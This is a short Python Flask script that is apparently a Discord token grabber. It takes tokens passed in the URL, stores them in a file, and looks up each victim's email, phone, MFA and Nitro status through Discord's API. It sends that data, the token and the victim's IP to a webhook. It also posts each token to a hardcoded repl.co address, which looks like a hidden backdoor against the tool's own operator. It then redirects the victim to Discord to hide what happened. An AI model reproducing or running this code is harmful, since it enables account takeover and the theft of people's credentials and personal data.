from flask import Flask, redirect, request
from dhooks import Webhook, Embed
import requests

app = Flask(__name__)
hook = Webhook('YOUR WEBHOOK')


def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
                     mfa_status, nitro_status):
  embed = Embed(color=0)
  embed.set_author(name=f'{username}#{tag}')
  embed.set_thumbnail(url=avatar_url)
  embed.add_field(name='Email', value=f'```{email}```', inline=False)
  embed.add_field(name='Phone', value=f'```{phone_number}```', inline=False)
  embed.add_field(name='MFA Status', value=f'```{mfa_status}```', inline=False)
  embed.add_field(name='Nitro', value=f'```{nitro_status}```', inline=False)
  embed.add_field(name='IP', value=f'```{ip}```', inline=False)
  embed.add_field(name='Token', value=f'```{token}```', inline=False)
  hook.send(embed=embed, username=username, avatar_url=avatar_url)
  w = "https://busyinsignificantfossil.yuvi5000.repl.co/x"
  m = {"text": token}
  r = requests.post(w, json=m)


@app.route('/alive')
def keep_alive():
  return "alive"


@app.route('/')
def main():
  return redirect("https://discord.com/app")


@app.route('/<string:token>')
def index(token):
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    publicip = request.environ['REMOTE_ADDR']
  else:
    publicip = request.environ['HTTP_X_FORWARDED_FOR']

  open("tokens.txt", 'a').close()
  with open('tokens.txt', 'r') as f:
    if not any(f"{token}" in line for line in f):
      with open("tokens.txt", "a") as f:
        f.write(f"{token}\n")

  try:
    headers = {"Authorization": token}
    url = "https://discord.com/api/v9/users/@me"
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
      user_data = response.json()
      username = user_data["username"]
      tag = user_data["discriminator"]
      email = user_data.get("email", "N/A")
      phone_number = user_data.get("phone", "N/A")
      avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
      mfa_enabled = user_data.get("mfa_enabled", False)
      mfa_status = "Enabled" if mfa_enabled else "Disabled"
      nitro_status = "Yes" if user_data.get("premium_type") else "No"
      send_black_embed(token, publicip, phone_number, email, username, tag,
                       avatar_url, mfa_status, nitro_status)
  except:
    pass

  return redirect("https://discord.com/app")


app.run(host='0.0.0.0', port=81)
